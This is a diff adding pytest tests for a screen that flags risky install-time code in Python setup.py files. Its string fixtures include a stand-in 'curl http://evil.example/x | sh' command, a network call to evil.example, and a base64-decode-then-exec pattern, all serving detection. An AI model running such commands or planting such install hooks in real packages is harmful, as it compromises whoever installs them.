@@ -19,9 +19,11 @@ from adapters.dependencies import (
     _edit_distance,
     admission_concerns,
     audit_dependencies,
+    install_hook_concerns,
     read_declared,
     read_ledger,
     render_dependencies,
+    screen_source,
 )
 
 _GOOD_ROW = 'why = "w"\nstdlib_alternative = "s"\nremovable = "r"\n'
@@ -161,3 +163,89 @@ def test_screen_uses_the_real_ledger_and_clears_our_own_deps() -> None:
     # every real declared dep is justified (trusted), so none trips the screen
     assert screen_name("sqlalchemy") == []
     assert POPULAR_PACKAGES  # the curated set is non-empty
+
+
+# --- behavioral admission screen: what the install-time code DOES (#25) --------------------------
+_CLEAN_SETUP = """
+from setuptools import setup, find_packages
+
+setup(
+    name="honest-lib",
+    version="1.2.3",
+    packages=find_packages(),
+    install_requires=["requests"],  # a declared runtime dep is not an install-time import
+)
+"""
+
+
+def test_a_clean_setup_py_has_no_install_concerns() -> None:
+    # naming a dependency in install_requires is data, not an install-time import of the module
+    assert install_hook_concerns(_CLEAN_SETUP) == []
+
+
+def test_install_time_network_is_flagged() -> None:
+    src = (
+        "import urllib.request\n"
+        "urllib.request.urlopen('http://evil.example/x')\n"
+        "from setuptools import setup\nsetup(name='x')\n"
+    )
+    concerns = install_hook_concerns(src)
+    assert any("network" in c for c in concerns)
+
+
+def test_install_time_shell_execution_is_flagged() -> None:
+    src = (
+        "import os\n"
+        "os.system('curl http://evil.example/x | sh')\n"
+        "from setuptools import setup\nsetup(name='x')\n"
+    )
+    concerns = install_hook_concerns(src)
+    assert any("process/shell" in c for c in concerns)
+
+
+def test_subprocess_import_is_flagged_for_review() -> None:
+    src = (
+        "import subprocess\n"
+        "subprocess.run(['git', 'describe'])\n"
+        "from setuptools import setup\nsetup(name='x')\n"
+    )
+    # a benign git call still surfaces for human review (propose-only screen), not a silent pass
+    assert any("process/shell" in c for c in install_hook_concerns(src))
+
+
+def test_dynamic_exec_is_flagged() -> None:
+    assert any("dynamic code execution" in c for c in install_hook_concerns("exec('print(1)')\n"))
+
+
+def test_decode_then_exec_is_the_obfuscation_shape() -> None:
+    src = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
+    concerns = install_hook_concerns(src)
+    assert any("dynamic code execution" in c for c in concerns)
+    assert any("obfuscated payload" in c for c in concerns)  # decode + exec together
+
+
+def test_decode_without_exec_is_not_the_obfuscation_shape() -> None:
+    # base64 alone (no eval/exec) is not the hidden-install-hook pattern -> no false positive
+    concerns = install_hook_concerns("import base64\nx = base64.b64encode(b'data')\n")
+    assert not any("obfuscated" in c or "dynamic code" in c for c in concerns)
+
+
+def test_an_unparseable_setup_is_treated_as_suspicious() -> None:
+    concerns = install_hook_concerns("this is not python !!!(\n")
+    assert len(concerns) == 1 and "does not parse" in concerns[0]
+
+
+def test_screen_source_reads_a_file(tmp_path: Path) -> None:
+    p = tmp_path / "setup.py"
+    p.write_text("import socket\nsocket.socket()\n", encoding="utf-8")
+    assert any("network" in c for c in screen_source(p))
+
+
+def test_screen_source_finds_setup_py_in_a_directory(tmp_path: Path) -> None:
+    (tmp_path / "setup.py").write_text(_CLEAN_SETUP, encoding="utf-8")
+    assert screen_source(tmp_path) == []
+
+
+def test_screen_source_missing_file_is_loud(tmp_path: Path) -> None:
+    with pytest.raises(OSError):  # noqa: PT011 - FileNotFoundError; a screen you cannot run is not "clean"
+        screen_source(tmp_path / "nope.py")
